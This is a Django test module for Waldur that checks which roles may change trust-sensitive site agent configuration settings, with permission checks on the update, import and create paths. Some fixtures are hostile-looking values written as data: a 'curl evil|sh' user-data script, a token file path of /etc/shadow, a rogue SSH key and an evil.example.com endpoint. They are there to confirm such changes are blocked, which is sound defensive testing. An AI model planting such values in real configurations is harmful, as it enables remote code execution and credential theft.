"""Who may change where a site agent connects or what it runs (#1272).

The trust-sensitive part of an agent configuration -- role backends, custom
backends, event settings and the backend settings the plugin catalogue marks
sensitive -- needs OFFERING.UPDATE_AGENT_CONFIGURATION on every path that
writes the configuration; the rest needs only that path's own permission.
"""

import copy
import importlib
from pathlib import Path
from unittest import mock

import yaml
from django.apps import apps
from django.conf import settings
from django.contrib.contenttypes.models import ContentType
from django.db.models.signals import post_save
from django.urls import reverse
from rest_framework import status, test

from waldur_core.configuration.testing import override_config
from waldur_core.permissions.enums import PermissionEnum
from waldur_core.permissions.fixtures import (
    CustomerRole,
    OfferingRole,
    ServiceProviderRole,
)
from waldur_core.permissions.models import Role, RolePermission
from waldur_core.permissions.tests.pat_utils import use_pat
from waldur_core.structure.models import Customer
from waldur_core.structure.tests import factories as structure_factories
from waldur_core.structure.tests import fixtures as structure_fixtures
from waldur_mastermind.marketplace import models as marketplace_models
from waldur_mastermind.marketplace.enums import SITE_AGENT_OFFERING
from waldur_mastermind.marketplace.tests import factories
from waldur_mastermind.marketplace_site_agent import agent_configuration

PERMISSIONS_YAML = Path(settings.BASE_DIR) / "docker/rootfs/etc/waldur/permissions.yaml"
PERMISSION = PermissionEnum.UPDATE_OFFERING_AGENT_CONFIGURATION

SLURM_SETTINGS = {
    "default_account": "root",
    "customer_prefix": "c_",
    "project_prefix": "p_",
    "allocation_prefix": "a_",
    "cluster_name": "alpha",
    "execution_mode": "rest",
    "rest_api": {
        "url": "http://slurmrestd:6820",
        "username": "slurm",
        "token_file": "/etc/slurm/jwt",
    },
}
CONFIGURATION = {
    "order_processing_backend": "slurm",
    "membership_sync_backend": "slurm",
    "reporting_backend": "slurm",
    "backend_settings": SLURM_SETTINGS,
    "backend_components": {"node": {"unit_factor_reporting": 1}},
}


def changed(path, value):
    """CONFIGURATION with the value at a dotted path replaced."""
    configuration = copy.deepcopy(CONFIGURATION)
    *parents, leaf = path.split(".")
    node = configuration
    for key in parents:
        node = node[key]
    node[leaf] = value
    return configuration


class TrustSensitiveChangesTest(test.APITestCase):
    def changes(self, old, new):
        return agent_configuration.trust_sensitive_changes(old, new)

    def test_unchanged_configuration_has_no_changes(self):
        self.assertEqual(self.changes(CONFIGURATION, copy.deepcopy(CONFIGURATION)), [])

    def test_role_backends_custom_backends_and_event_settings(self):
        new = {
            **CONFIGURATION,
            "reporting_backend": "cscs-dwdi-compute",
            "custom_backends": ["site-plugin"],
            "event_settings": {"stomp_ws_host": "broker.example.com"},
        }

        self.assertEqual(
            self.changes(CONFIGURATION, new),
            ["custom_backends", "event_settings.stomp_ws_host", "reporting_backend"],
        )

    def test_sensitive_settings_are_named_by_their_path(self):
        new = changed("backend_settings.rest_api.token_file", "/etc/shadow")
        new["backend_settings"]["slurm_bin_path"] = "/tmp/bin"

        self.assertEqual(
            self.changes(CONFIGURATION, new),
            [
                "backend_settings.rest_api.token_file",
                "backend_settings.slurm_bin_path",
            ],
        )

    def test_removing_a_block_changes_the_sensitive_settings_in_it(self):
        new = copy.deepcopy(CONFIGURATION)
        del new["backend_settings"]["rest_api"]

        self.assertEqual(
            self.changes(CONFIGURATION, new),
            [
                "backend_settings.rest_api.token_file",
                "backend_settings.rest_api.url",
                "backend_settings.rest_api.username",
            ],
        )

    def test_a_sensitive_mapping_is_compared_as_a_whole(self):
        old = {"backend_settings": {"storage_path_mapping": {"r1": "/store/a"}}}
        new = {"backend_settings": {"storage_path_mapping": {"r1": "/store/b"}}}

        self.assertEqual(
            self.changes(old, new), ["backend_settings.storage_path_mapping"]
        )

    def test_other_settings_are_not_sensitive(self):
        new = changed("backend_settings.default_account", "other")
        new["backend_components"] = {"node": {"unit_factor_reporting": 60}}

        self.assertEqual(self.changes(CONFIGURATION, new), [])

    def test_a_blank_backend_is_no_backend(self):
        self.assertEqual(
            self.changes(
                {"custom_backends": [], "event_settings": {}, "reporting_backend": ""},
                {},
            ),
            [],
        )

    def test_an_unset_event_setting_rendered_as_null_is_unchanged(self):
        # GET renders a field that was never set as null; posting it back
        # changes nothing.
        old = {"event_settings": {"stomp_enabled": True}}
        new = {
            "event_settings": {
                "stomp_enabled": True,
                "stomp_membership_sync_enabled": None,
            }
        }

        self.assertEqual(self.changes(old, new), [])
        new["event_settings"]["stomp_ws_port"] = 443
        self.assertEqual(self.changes(old, new), ["event_settings.stomp_ws_port"])

    def test_agent_settings_that_decide_what_is_imported_or_removed(self):
        for key in agent_configuration.TRUST_SENSITIVE_AGENT_SETTINGS:
            with self.subTest(key=key):
                for old, new in (
                    ({}, {key: False}),
                    ({key: False}, {key: True}),
                    ({key: True}, {}),
                ):
                    self.assertEqual(
                        self.changes(
                            {**CONFIGURATION, "agent_settings": old},
                            {**CONFIGURATION, "agent_settings": new},
                        ),
                        [f"agent_settings.{key}"],
                    )

    def test_omitting_anomalous_usage_only_affects_billing(self):
        old = {**CONFIGURATION}
        new = {
            **CONFIGURATION,
            "agent_settings": {"omit_anomalous_usage_components": True},
        }

        self.assertEqual(self.changes(old, new), [])

    def test_an_unset_agent_setting_rendered_as_null_is_unchanged(self):
        old = {"agent_settings": {"resource_import_enabled": True}}
        new = {
            "agent_settings": {
                "resource_import_enabled": True,
                "username_reconciliation_enabled": None,
            }
        }

        self.assertEqual(self.changes(old, new), [])

    def test_an_empty_setting_is_not_an_absent_one(self):
        # The agent reads an absent setting as its default and an empty one as
        # is: project_directory.base_path "" puts directories under /.
        old = copy.deepcopy(CONFIGURATION)
        old["backend_settings"]["project_directory"] = {"enabled": True}
        new = copy.deepcopy(old)
        new["backend_settings"]["project_directory"]["base_path"] = ""
        new["backend_settings"]["slurm_bin_path"] = None

        self.assertEqual(
            self.changes(old, new),
            [
                "backend_settings.project_directory.base_path",
                "backend_settings.slurm_bin_path",
            ],
        )

    def test_core_settings_and_the_legacy_hostname_are_not_sensitive(self):
        # Every backend's schema declares the settings the agent core reads,
        # and SLURM declares hostname, which the move out of plugin_options
        # put into backend_settings, though the agent never reads it.
        old = copy.deepcopy(CONFIGURATION)
        old["backend_settings"]["hostname"] = "slurm.example.com"
        new = copy.deepcopy(CONFIGURATION)
        new["backend_settings"].update(
            soft_delete=True,
            check_backend_id_uniqueness=True,
            check_all_offerings=True,
            backend_id_max_retries=10,
        )

        self.assertEqual(self.changes(old, new), [])

    def test_undeclared_settings_are_sensitive(self):
        # SLURM's schema is open: undeclared keys pass validation, and the
        # agent may read them.
        new = copy.deepcopy(CONFIGURATION)
        new["backend_settings"]["site_hook"] = "/tmp/run.sh"
        new["backend_settings"]["rest_api"]["extra"] = "x"
        new["backend_settings"]["ldap"] = {
            "uri": "ldap://x",
            "bind_dn": "cn=a",
            "base_dn": "dc=x",
            "undeclared_option": "y",
            "waldur_username_attribute": "cuid",
        }

        found = self.changes(CONFIGURATION, new)

        self.assertIn("backend_settings.site_hook", found)
        self.assertIn("backend_settings.rest_api.extra", found)
        self.assertIn("backend_settings.ldap.undeclared_option", found)
        # Declared and not marked sensitive.
        self.assertNotIn("backend_settings.ldap.waldur_username_attribute", found)

    def test_settings_of_a_custom_backend_are_sensitive(self):
        custom = {
            "order_processing_backend": "site-plugin",
            "custom_backends": ["site-plugin"],
            "backend_settings": {"site_endpoint": "https://good.example.com"},
        }
        new = copy.deepcopy(custom)
        new["backend_settings"]["site_endpoint"] = "https://evil.example.com"
        new["backend_settings"]["site_bin"] = "/tmp/evil"

        self.assertEqual(
            self.changes(custom, new),
            ["backend_settings.site_bin", "backend_settings.site_endpoint"],
        )

    def test_settings_that_grant_access_or_install_are_sensitive(self):
        # The cases the security review found unguarded.
        old = {
            "username_management_backend": "ldap",
            "backend_settings": {"ldap": {"uri": "ldaps://ok", "access_groups": []}},
        }
        new = copy.deepcopy(old)
        ldap = new["backend_settings"]["ldap"]
        ldap["access_groups"] = [{"name": "wheel"}]
        ldap["project_groups"] = {"parents": [{"dn": "cn=admins,ou=groups,dc=x"}]}
        ldap["base_dn"] = "dc=other"
        new["backend_settings"]["default_user_data"] = "#!/bin/sh\ncurl evil|sh"
        new["backend_settings"]["default_ssh_public_key"] = "ssh-ed25519 AAAA evil"
        new["backend_settings"]["cluster_role_map"] = {"manager": "cluster-admin"}

        self.assertEqual(
            self.changes(old, new),
            [
                "backend_settings.cluster_role_map",
                "backend_settings.default_ssh_public_key",
                "backend_settings.default_user_data",
                "backend_settings.ldap.access_groups[0].name",
                "backend_settings.ldap.base_dn",
                "backend_settings.ldap.project_groups.parents[0].dn",
            ],
        )

    def test_sensitivity_comes_from_the_catalogue_not_from_names(self):
        entry = {
            "type": "object",
            "properties": {"uri": {"type": "string"}, "base_dn": {"type": "string"}},
        }
        catalogue = {
            "catalogue_version": 1,
            "plugins": [
                {
                    "name": "fake",
                    "roles": ["order_processing"],
                    "settings_schema": {
                        "type": "object",
                        "properties": {
                            "default_account": {"type": "string"},
                            "api_url": {"type": "string"},
                            "by_name": {
                                "type": "object",
                                "additionalProperties": {"$ref": "#/$defs/Entry"},
                            },
                            "listed": {
                                "type": "array",
                                "items": {"$ref": "#/$defs/Entry"},
                            },
                        },
                        "$defs": {"Entry": entry},
                    },
                    "sensitive_settings": [
                        "default_account",
                        "by_name.*.uri",
                        "listed[].uri",
                    ],
                    "sensitive_component_settings": ["site_script"],
                }
            ],
        }
        old = {
            "order_processing_backend": "fake",
            "backend_settings": {
                "default_account": "root",
                "api_url": "https://a.example.com",
                "by_name": {"x": {"uri": "ldap://a", "base_dn": "dc=a"}},
                "listed": [{"uri": "ldap://a"}],
            },
            "backend_components": {"node": {"site_script": "a", "other": 1}},
        }
        new = {
            "order_processing_backend": "fake",
            "backend_settings": {
                "default_account": "other",
                "api_url": "https://b.example.com",
                "by_name": {"x": {"uri": "ldap://b", "base_dn": "dc=b"}},
                "listed": [{"uri": "ldap://b"}],
            },
            "backend_components": {"node": {"site_script": "b", "other": 2}},
        }
        caches = (
            agent_configuration.sensitive_setting_paths,
            agent_configuration.sensitive_component_paths,
        )
        for cache in caches:
            cache.cache_clear()
        try:
            with mock.patch.object(
                agent_configuration, "load_catalogue", return_value=catalogue
            ):
                found = self.changes(old, new)
        finally:
            for cache in caches:
                cache.cache_clear()

        # api_url and base_dn are declared and not marked: their names do
        # not matter.
        self.assertEqual(
            found,
            [
                "backend_components.node.site_script",
                "backend_settings.by_name.x.uri",
                "backend_settings.default_account",
                "backend_settings.listed[0].uri",
            ],
        )

    def test_vendored_catalogue_marks_the_settings_the_issue_names(self):
        paths = agent_configuration.sensitive_setting_paths()
        for path in (
            "rest_api.token_file",
            "rest_api.url",
            "slurm_bin_path",
            "execution_mode",
            "saml_mapping_file",
            "storage_path_mapping",
            "cscs_dwdi_oidc_token_url",
            "ldap.uri",
            "target_api_url",
            "kubeconfig_path",
            "homedir_base_path",
        ):
            self.assertIn(path, paths)
        self.assertFalse(set(paths) & agent_configuration.secret_setting_names())


class DefaultGrantTest(test.APITestCase):
    def test_permissions_yaml_grants_it_with_the_integration_permission(self):
        rows = yaml.safe_load(PERMISSIONS_YAML.read_text())
        holders = {
            row["role"] for row in rows if PERMISSION.value in row["permissions"]
        }

        self.assertEqual(
            holders, {"CUSTOMER.OWNER", "CUSTOMER.MANAGER", "OFFERING.MANAGER"}
        )
        self.assertEqual(
            holders,
            {
                row["role"]
                for row in rows
                if PermissionEnum.UPDATE_OFFERING_INTEGRATION.value
                in row["permissions"]
            },
        )


class GrantMigrationTest(test.APITestCase):
    def test_every_role_with_the_integration_permission_gets_it(self):
        migration = importlib.import_module(
            "waldur_core.permissions.migrations.0040_agent_configuration_permission"
        )
        content_type = ContentType.objects.get_for_model(Customer)
        clone = Role.objects.create(
            name="CUSTOMER.acme.OWNER",
            content_type=content_type,
            template=CustomerRole.OWNER,
        )
        custom = Role.objects.create(name="Integrator", content_type=content_type)
        unrelated = Role.objects.create(name="Bystander", content_type=content_type)
        for role in (CustomerRole.OWNER, OfferingRole.MANAGER, clone, custom):
            role.add_permission(PermissionEnum.UPDATE_OFFERING_INTEGRATION)
        RolePermission.objects.filter(permission=PERMISSION.value).delete()

        migration.grant_agent_configuration(apps, None)
        migration.grant_agent_configuration(apps, None)  # idempotent

        holders = RolePermission.objects.filter(permission=PERMISSION.value)
        self.assertEqual(
            sorted(holders.values_list("role__name", flat=True)),
            sorted(
                [
                    CustomerRole.OWNER.name,
                    OfferingRole.MANAGER.name,
                    clone.name,
                    custom.name,
                ]
            ),
        )
        self.assertNotIn(unrelated.name, holders.values_list("role__name", flat=True))


class AgentConfigurationTrustTestMixin:
    """An offering with a SLURM agent configuration, its owner, service provider
    manager and offering manager, with the roles' grants from permissions.yaml.
    """

    def setUp(self):
        self.fixture = structure_fixtures.ProjectFixture()
        self.customer = self.fixture.customer
        self.service_provider = factories.ServiceProviderFactory(customer=self.customer)
        self.category = factories.CategoryFactory(title="HPC")
        self.offering = factories.OfferingFactory(
            customer=self.customer,
            type=SITE_AGENT_OFFERING,
            name="Cluster",
            category=self.category,
            agent_configuration=copy.deepcopy(CONFIGURATION),
        )
        factories.OfferingComponentFactory(
            offering=self.offering, type="node", name="Node hours"
        )
        self.grant_defaults()
        self.owner = self.fixture.owner
        self.customer_manager = structure_factories.UserFactory()
        self.service_provider.add_user(
            self.customer_manager, ServiceProviderRole.MANAGER
        )
        self.offering_manager = structure_factories.UserFactory()
        self.offering.add_user(self.offering_manager, OfferingRole.MANAGER)

    @staticmethod
    def grant_defaults():
        """Give the three roles what docker/rootfs/etc/waldur/permissions.yaml does."""
        roles = {
            "CUSTOMER.OWNER": CustomerRole.OWNER,
            "CUSTOMER.MANAGER": ServiceProviderRole.MANAGER,
            "OFFERING.MANAGER": OfferingRole.MANAGER,
        }
        for row in yaml.safe_load(PERMISSIONS_YAML.read_text()):
            if row["role"] in roles:
                for permission in row["permissions"]:
                    roles[row["role"]].add_permission(permission)

    @staticmethod
    def withdraw_from_offering_managers():
        """As a deployment's permissions-override.yaml would."""
        OfferingRole.MANAGER.delete_permission(PERMISSION.value)

    def stored(self):
        self.offering.refresh_from_db()
        return self.offering.agent_configuration


class UpdateIntegrationTrustTest(AgentConfigurationTrustTestMixin, test.APITestCase):
    def update(self, user, configuration):
        self.client.force_authenticate(user)
        return self.client.post(
            factories.OfferingFactory.get_url(self.offering, "update_integration"),
            {"agent_configuration": configuration},
            format="json",
        )

    def test_by_default_every_role_changes_every_setting(self):
        for index, user in enumerate(
            (self.owner, self.customer_manager, self.offering_manager)
        ):
            with self.subTest(user=user.username):
                configuration = changed(
                    "backend_settings.rest_api.url", f"http://slurmrestd-{index}:6820"
                )
                configuration["event_settings"] = {
                    "stomp_ws_host": f"broker-{index}.example.com"
                }

                response = self.update(user, configuration)

                self.assertEqual(
                    response.status_code, status.HTTP_200_OK, response.data
                )
                self.assertEqual(self.stored(), configuration)

    def test_sensitive_setting_needs_the_permission(self):
        self.withdraw_from_offering_managers()

        response = self.update(
            self.offering_manager,
            changed("backend_settings.rest_api.token_file", "/etc/shadow"),
        )

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("backend_settings.rest_api.token_file", str(response.data))
        self.assertEqual(self.stored(), CONFIGURATION)

    def test_role_backend_needs_the_permission(self):
        self.withdraw_from_offering_managers()

        configuration = changed("reporting_backend", "site-reporting")
        configuration["custom_backends"] = ["site-reporting"]

        response = self.update(self.offering_manager, configuration)

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("custom_backends, reporting_backend", str(response.data))

    def test_event_settings_need_the_permission(self):
        self.withdraw_from_offering_managers()
        configuration = {
            **CONFIGURATION,
            "event_settings": {"stomp_ws_host": "broker.example.com"},
        }

        response = self.update(self.offering_manager, configuration)

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("event_settings", str(response.data))

    def test_agent_settings_that_import_or_remove_need_the_permission(self):
        self.withdraw_from_offering_managers()
        for key in agent_configuration.TRUST_SENSITIVE_AGENT_SETTINGS:
            with self.subTest(key=key):
                response = self.update(
                    self.offering_manager,
                    {**CONFIGURATION, "agent_settings": {key: True}},
                )

                self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
                self.assertIn(f"agent_settings.{key}", str(response.data))
                self.assertEqual(self.stored(), CONFIGURATION)

    def test_omitting_anomalous_usage_needs_no_permission(self):
        self.withdraw_from_offering_managers()
        configuration = {
            **CONFIGURATION,
            "agent_settings": {"omit_anomalous_usage_components": True},
        }

        response = self.update(self.offering_manager, configuration)

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.stored(), configuration)

    def test_other_settings_and_an_unchanged_configuration_are_saved(self):
        self.withdraw_from_offering_managers()

        response = self.update(self.offering_manager, copy.deepcopy(CONFIGURATION))
        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)

        configuration = changed("backend_settings.default_account", "other")
        configuration["backend_components"] = {"node": {"unit_factor_reporting": 60}}
        response = self.update(self.offering_manager, configuration)

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.stored(), configuration)

    def test_owner_keeps_the_permission(self):
        self.withdraw_from_offering_managers()
        configuration = changed("backend_settings.slurm_bin_path", "/opt/slurm/bin")

        response = self.update(self.owner, configuration)

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.stored(), configuration)

    def commit_meanwhile(self, configuration):
        """Patch a step of update_integration's validation, which runs after
        get_object() read the offering, to store another configuration: a
        change committed by someone else while this request is under way."""

        def store(*args, **kwargs):
            marketplace_models.Offering.objects.filter(pk=self.offering.pk).update(
                agent_configuration=configuration
            )

        return mock.patch(
            "waldur_mastermind.marketplace.serializers.validate_uses_robot_accounts",
            side_effect=store,
        )

    def test_checked_against_the_stored_configuration(self):
        # The request sends back the configuration get_object() read; another
        # one is stored meanwhile. Compared with the copy, nothing changes;
        # compared with what is stored, rest_api.url does.
        self.withdraw_from_offering_managers()

        with self.commit_meanwhile(
            changed("backend_settings.rest_api.url", "http://other:6820")
        ):
            response = self.update(self.offering_manager, copy.deepcopy(CONFIGURATION))

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("backend_settings.rest_api.url", str(response.data))

    def test_an_update_without_configuration_keeps_a_concurrent_change(self):
        self.withdraw_from_offering_managers()
        meanwhile = changed("backend_settings.rest_api.url", "http://other:6820")
        self.client.force_authenticate(self.offering_manager)

        with self.commit_meanwhile(meanwhile):
            response = self.client.post(
                factories.OfferingFactory.get_url(self.offering, "update_integration"),
                {"plugin_options": {}},
                format="json",
            )

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.stored(), meanwhile)

    def test_a_concurrent_plugin_options_change_is_not_this_saves_change(self):
        # plugin_options handlers act on tracker.has_changed("plugin_options");
        # a change committed meanwhile must not look like this request's.
        seen = []

        def record(sender, instance, created=False, **kwargs):
            if instance.pk == self.offering.pk:
                seen.append(instance.tracker.has_changed("plugin_options"))

        def store(*args, **kwargs):
            marketplace_models.Offering.objects.filter(pk=self.offering.pk).update(
                plugin_options={"auto_approve_remote_orders": True}
            )

        post_save.connect(record, sender=marketplace_models.Offering)
        try:
            with mock.patch(
                "waldur_mastermind.marketplace.serializers.validate_uses_robot_accounts",
                side_effect=store,
            ):
                response = self.update(self.owner, copy.deepcopy(CONFIGURATION))
        finally:
            post_save.disconnect(record, sender=marketplace_models.Offering)

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(seen, [False])
        self.offering.refresh_from_db()
        self.assertEqual(
            self.offering.plugin_options, {"auto_approve_remote_orders": True}
        )

    def test_the_configuration_read_back_saves_unchanged(self):
        self.withdraw_from_offering_managers()
        configuration = {
            **copy.deepcopy(CONFIGURATION),
            "event_settings": {"stomp_enabled": True, "stomp_ws_host": "broker"},
        }
        marketplace_models.Offering.objects.filter(pk=self.offering.pk).update(
            agent_configuration=configuration
        )
        self.client.force_authenticate(self.offering_manager)
        read = self.client.get(factories.OfferingFactory.get_url(self.offering))
        self.assertEqual(read.status_code, status.HTTP_200_OK)

        response = self.update(self.offering_manager, read.data["agent_configuration"])

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(
            agent_configuration.trust_sensitive_changes(configuration, self.stored()),
            [],
        )

    def test_an_empty_setting_needs_the_permission(self):
        self.withdraw_from_offering_managers()
        old = copy.deepcopy(CONFIGURATION)
        old["backend_settings"]["project_directory"] = {"enabled": True}
        marketplace_models.Offering.objects.filter(pk=self.offering.pk).update(
            agent_configuration=old
        )
        new = copy.deepcopy(old)
        new["backend_settings"]["project_directory"]["base_path"] = ""

        response = self.update(self.offering_manager, new)

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("project_directory.base_path", str(response.data))

    def test_settings_of_a_custom_backend_need_the_permission(self):
        custom = {
            "order_processing_backend": "site-plugin",
            "membership_sync_backend": "site-plugin",
            "reporting_backend": "site-plugin",
            "custom_backends": ["site-plugin"],
            "backend_settings": {"site_endpoint": "https://good.example.com"},
        }
        marketplace_models.Offering.objects.filter(pk=self.offering.pk).update(
            agent_configuration=custom
        )
        self.withdraw_from_offering_managers()
        new = copy.deepcopy(custom)
        new["backend_settings"]["site_endpoint"] = "https://evil.example.com"

        response = self.update(self.offering_manager, new)

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("backend_settings.site_endpoint", str(response.data))

    @override_config(PAT_ENABLED=True)
    def test_a_token_needs_the_scope_for_a_sensitive_change(self):
        # The owner's role holds the permission; a token scoped to the
        # integration permission alone does not.
        use_pat(
            self.client, self.owner, PermissionEnum.UPDATE_OFFERING_INTEGRATION.value
        )
        url = factories.OfferingFactory.get_url(self.offering, "update_integration")

        response = self.client.post(
            url,
            {"agent_configuration": changed("backend_settings.slurm_bin_path", "/x")},
            format="json",
        )
        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("backend_settings.slurm_bin_path", str(response.data))

        configuration = changed("backend_settings.default_account", "other")
        response = self.client.post(
            url, {"agent_configuration": configuration}, format="json"
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.stored(), configuration)


class ImportOfferingTrustTest(AgentConfigurationTrustTestMixin, test.APITestCase):
    def setUp(self):
        super().setUp()
        # import_offering needs CREATE_OFFERING on the organization, which an
        # offering manager does not have by default: here they also hold a
        # role of the deployment's own that lets them create offerings.
        creator = Role.objects.create(
            name="Offering creator",
            content_type=ContentType.objects.get_for_model(Customer),
        )
        creator.add_permission(PermissionEnum.CREATE_OFFERING)
        self.customer.add_user(self.offering_manager, creator)

    def import_offering(self, user, configuration, name="Cluster", overwrite=True):
        document = {
            "offering": {
                "name": name,
                "type": SITE_AGENT_OFFERING,
                "category_name": self.category.title,
            },
            "components": [
                {
                    "type": "node",
                    "name": "Node hours",
                    "billing_type": "limit",
                    "measured_unit": "node-hours",
                }
            ],
        }
        if configuration is not None:
            document["agent_configuration"] = configuration
        self.client.force_authenticate(user)
        return self.client.post(
            reverse("marketplace-provider-offering-import-offering"),
            {
                "customer": self.customer.uuid.hex,
                "category": self.category.title,
                "overwrite_existing": overwrite,
                "offering_data": yaml.safe_dump(document),
            },
        )

    def test_by_default_an_overwriting_import_changes_every_setting(self):
        configuration = changed("backend_settings.rest_api.url", "http://other:6820")

        response = self.import_offering(self.offering_manager, configuration)

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.stored(), configuration)

    def test_overwriting_a_sensitive_setting_needs_the_permission(self):
        self.withdraw_from_offering_managers()

        response = self.import_offering(
            self.offering_manager,
            changed("backend_settings.rest_api.token_file", "/etc/shadow"),
        )

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("backend_settings.rest_api.token_file", str(response.data))
        self.assertEqual(self.stored(), CONFIGURATION)

    def test_overwriting_other_settings_or_nothing_is_allowed(self):
        self.withdraw_from_offering_managers()

        response = self.import_offering(self.offering_manager, None)
        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.stored(), CONFIGURATION)

        configuration = changed("backend_settings.default_account", "other")
        response = self.import_offering(self.offering_manager, configuration)

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.stored(), configuration)

    def test_an_old_export_carrying_hostname_needs_no_permission(self):
        # Exports made before the move hold hostname in plugin_options; the
        # import moves it into backend_settings.
        self.withdraw_from_offering_managers()
        self.client.force_authenticate(self.offering_manager)
        document = {
            "offering": {
                "name": "Cluster",
                "type": SITE_AGENT_OFFERING,
                "category_name": self.category.title,
            },
            "plugin_options": {"hostname": "slurm.example.com"},
        }

        response = self.client.post(
            reverse("marketplace-provider-offering-import-offering"),
            {
                "customer": self.customer.uuid.hex,
                "category": self.category.title,
                "overwrite_existing": True,
                "offering_data": yaml.safe_dump(document),
            },
        )

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(
            self.stored()["backend_settings"]["hostname"], "slurm.example.com"
        )

    def test_importing_a_new_offering_is_checked_on_the_organization(self):
        CustomerRole.OWNER.delete_permission(PERMISSION.value)

        response = self.import_offering(
            self.owner, copy.deepcopy(CONFIGURATION), name="New", overwrite=False
        )

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("order_processing_backend", str(response.data))
        self.assertFalse(
            marketplace_models.Offering.objects.filter(name="New").exists()
        )


class CreateOfferingTrustTest(AgentConfigurationTrustTestMixin, test.APITestCase):
    def create(self, configuration):
        payload = {
            "name": "New cluster",
            "category": factories.CategoryFactory.get_url(self.category),
            "customer": structure_factories.CustomerFactory.get_url(self.customer),
            "type": SITE_AGENT_OFFERING,
            "components": [
                {
                    "type": "node",
                    "name": "Node hours",
                    "measured_unit": "node-hours",
                    "billing_type": "limit",
                }
            ],
            "plans": [{"name": "Default", "unit": "month"}],
        }
        if configuration is not None:
            payload["agent_configuration"] = configuration
        self.client.force_authenticate(self.owner)
        return self.client.post(
            factories.OfferingFactory.get_list_url(), payload, format="json"
        )

    def test_owner_creates_with_a_configuration_by_default(self):
        response = self.create(copy.deepcopy(CONFIGURATION))

        self.assertEqual(response.status_code, status.HTTP_201_CREATED, response.data)

    def test_creating_with_a_configuration_needs_the_permission(self):
        CustomerRole.OWNER.delete_permission(PERMISSION.value)

        response = self.create(copy.deepcopy(CONFIGURATION))

        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        self.assertIn("backend_settings.rest_api.url", str(response.data))
        self.assertFalse(
            marketplace_models.Offering.objects.filter(name="New cluster").exists()
        )

    def test_creating_without_a_configuration_does_not(self):
        CustomerRole.OWNER.delete_permission(PERMISSION.value)

        response = self.create(None)

        self.assertEqual(response.status_code, status.HTTP_201_CREATED, response.data)


class ComponentChangeTrustTest(AgentConfigurationTrustTestMixin, test.APITestCase):
    """Renaming or removing a component moves backend_components entries, which
    are not trust-sensitive, so it needs no agent configuration permission."""

    def test_renaming_a_component_moves_its_fields(self):
        self.withdraw_from_offering_managers()
        OfferingRole.MANAGER.add_permission(PermissionEnum.UPDATE_OFFERING_COMPONENTS)
        component = self.offering.components.get(type="node")
        self.client.force_authenticate(self.offering_manager)

        response = self.client.post(
            factories.OfferingFactory.get_url(
                self.offering, "update_offering_component"
            ),
            {"uuid": component.uuid.hex, "type": "node_hours"},
            format="json",
        )

        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(
            self.stored()["backend_components"],
            {"node_hours": {"unit_factor_reporting": 1}},
        )
